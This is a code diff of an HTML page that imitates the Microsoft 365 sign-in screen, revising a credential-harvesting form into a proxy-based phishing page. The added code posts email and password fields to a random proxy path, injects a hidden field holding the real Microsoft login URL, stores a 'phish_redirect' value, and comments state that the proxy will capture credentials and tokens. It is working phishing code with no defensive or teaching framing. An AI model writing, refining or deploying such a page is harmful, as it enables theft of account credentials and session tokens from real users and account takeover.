@@ -1,68 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to your account</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
             background: #f2f2f2;
-            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
         }
-        .main {
-            width: 100%;
-            max-width: 440px;
-            padding: 20px;
-        }
-        .card {
+        .container {
             background: #fff;
             border-radius: 8px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.12);
             padding: 44px 36px;
+            width: 440px;
+            max-width: 100%;
         }
-        .logo {
-            text-align: center;
-            margin-bottom: 28px;
-        }
+        .logo { text-align: center; margin-bottom: 28px; }
         .logo svg { height: 28px; }
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-            color: #1b1b1b;
-            margin-bottom: 4px;
-        }
-        .sub {
-            font-size: 15px;
-            color: #616161;
-            margin-bottom: 28px;
-        }
-        .input-group {
-            margin-bottom: 18px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #1b1b1b;
-            margin-bottom: 6px;
-        }
+        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; }
+        .sub { font-size: 15px; color: #616161; margin-bottom: 28px; }
+        .input-group { margin-bottom: 18px; }
+        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #1b1b1b; margin-bottom: 6px; }
         .input-group input {
-            width: 100%;
-            padding: 12px 14px;
-            font-size: 15px;
-            border: 1px solid #8b8b8b;
-            border-radius: 4px;
+            width: 100%; padding: 12px 14px; font-size: 15px;
+            border: 1px solid #8b8b8b; border-radius: 4px;
             background: #fbfbfb;
-            transition: border-color 0.2s;
         }
         .input-group input:focus {
             border-color: #005da6;
@@ -70,78 +39,61 @@
             box-shadow: 0 0 0 2px rgba(0,93,166,0.25);
         }
         .btn {
-            width: 100%;
-            padding: 12px;
-            font-size: 15px;
-            font-weight: 600;
-            color: #fff;
-            background: #005da6;
-            border: none;
-            border-radius: 4px;
+            width: 100%; padding: 12px; font-size: 15px; font-weight: 600;
+            color: #fff; background: #005da6; border: none; border-radius: 4px;
             cursor: pointer;
-            transition: background 0.2s;
         }
         .btn:hover { background: #004a87; }
-        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
         .footer {
-            margin-top: 28px;
-            font-size: 12px;
-            color: #757575;
-            text-align: center;
-            border-top: 1px solid #e6e6e6;
+            margin-top: 28px; font-size: 12px; color: #757575;
+            text-align: center; border-top: 1px solid #e6e6e6;
             padding-top: 20px;
         }
         .footer a { color: #005da6; text-decoration: none; }
-        .footer a:hover { text-decoration: underline; }
         .error { color: #d32f2f; font-size: 13px; margin-top: 6px; display: none; }
         .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
+            display: inline-block; width: 16px; height: 16px;
+            border: 2px solid rgba(255,255,255,0.3); border-radius: 50%;
+            border-top-color: #fff; animation: spin 0.8s linear infinite;
+            margin-right: 8px; vertical-align: middle;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        /* Hide the actual form action - we use JS to send to proxy */
     </style>
 </head>
 <body>
-    <div class="main">
-        <div class="card">
-            <div class="logo">
-                <svg viewBox="0 0 108 28" fill="none">
-                    <path d="M0 0H25.5V6.3H7.65V10.8H24.225V16.95H7.65V22.05H25.5V28H0V0Z" fill="#F25022"/>
-                    <path d="M30.6 0H56.1V6.3H38.25V10.8H54.825V16.95H38.25V22.05H56.1V28H30.6V0Z" fill="#7FBA00"/>
-                    <path d="M61.2 0H86.7V6.3H68.85V10.8H85.425V16.95H68.85V22.05H86.7V28H61.2V0Z" fill="#00A4EF"/>
-                    <path d="M91.8 0H108V6.3H98.6V10.8H107.8V16.95H98.6V22.05H108V28H91.8V0Z" fill="#FFB900"/>
-                </svg>
-            </div>
-            <h1>Sign in</h1>
-            <p class="sub">to continue to Microsoft 365</p>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 108 28" fill="none">
+                <path d="M0 0H25.5V6.3H7.65V10.8H24.225V16.95H7.65V22.05H25.5V28H0V0Z" fill="#F25022"/>
+                <path d="M30.6 0H56.1V6.3H38.25V10.8H54.825V16.95H38.25V22.05H56.1V28H30.6V0Z" fill="#7FBA00"/>
+                <path d="M61.2 0H86.7V6.3H68.85V10.8H85.425V16.95H68.85V22.05H86.7V28H61.2V0Z" fill="#00A4EF"/>
+                <path d="M91.8 0H108V6.3H98.6V10.8H107.8V16.95H98.6V22.05H108V28H91.8V0Z" fill="#FFB900"/>
+            </svg>
+        </div>
+        <h1>Sign in</h1>
+        <p class="sub">to continue to Microsoft 365</p>
 
-            <form id="loginForm" action="/capture" method="POST">
-                <div class="input-group">
-                    <label for="email">Email, phone, or Skype</label>
-                    <input type="text" id="email" name="email" placeholder="someone@example.com" autocomplete="username" required>
-                </div>
-                <div class="input-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
-                </div>
-                <div id="errorMsg" class="error"></div>
-                <button type="submit" class="btn" id="submitBtn">
-                    <span id="btnText">Sign in</span>
-                </button>
-            </form>
-
-            <div class="footer">
-                <a href="#">Forgot password?</a> &middot; <a href="#">Create one!</a>
-                <br><br>
-                © 2026 Microsoft
+        <!-- 🔥 FORM SUBMITS TO PROXY, NOT DIRECTLY TO MICROSOFT -->
+        <form id="loginForm" action="/lNv1pC9AWPUY4gbidyBO" method="POST">
+            <div class="input-group">
+                <label>Email, phone, or Skype</label>
+                <input type="text" id="email" name="loginfmt" placeholder="someone@example.com" autocomplete="username" required>
             </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" name="passwd" placeholder="Enter your password" autocomplete="current-password" required>
+            </div>
+            <div id="errorMsg" class="error"></div>
+            <button type="submit" class="btn" id="submitBtn">
+                <span id="btnText">Sign in</span>
+            </button>
+        </form>
+
+        <div class="footer">
+            <a href="#">Forgot password?</a> &middot; <a href="#">Create one!</a>
+            <br><br>
+            © 2026 Microsoft
         </div>
     </div>
 
@@ -154,14 +106,27 @@
             const btn = document.getElementById('submitBtn');
             const btnText = document.getElementById('btnText');
 
-            // ── Store redirect URL from URL param ──
+            // ── Get the real redirect URL from URL param ──
             const urlParams = new URLSearchParams(window.location.search);
             const redirectUri = urlParams.get('redirect_urI');
-            if (redirectUri) {
-                localStorage.setItem('phish_redirect', redirectUri);
-            }
+            const realUrl = redirectUri ? decodeURIComponent(redirectUri) : 'https://login.microsoftonline.com/';
 
-            // ── Form validation ──
+            // ── Store for proxy to use ──
+            localStorage.setItem('phish_redirect', realUrl);
+
+            // ── Set form action to proxy with real target ──
+            // The proxy will forward to the real URL
+            const proxyUrl = '/lNv1pC9AWPUY4gbidyBO';
+            form.action = proxyUrl;
+
+            // ── Add hidden field for the real target ──
+            const hiddenInput = document.createElement('input');
+            hiddenInput.type = 'hidden';
+            hiddenInput.name = 'url';
+            hiddenInput.value = realUrl;
+            form.appendChild(hiddenInput);
+
+            // ── Validation ──
             form.addEventListener('submit', function(e) {
                 const emailVal = email.value.trim();
                 const passVal = password.value.trim();
@@ -186,7 +151,8 @@
                 btn.disabled = true;
                 btnText.innerHTML = '<span class="spinner"></span>Signing in...';
 
-                // Form will submit to /capture
+                // Form submits to proxy which forwards to real Microsoft
+                // The proxy will capture credentials and tokens!
             });
 
             // ── Auto-fill from credential manager ──
@@ -201,7 +167,7 @@
                     .catch(() => {});
             }
 
-            // ── Focus on email ──
+            // ── Focus ──
             email.focus();
         })();
     </script>
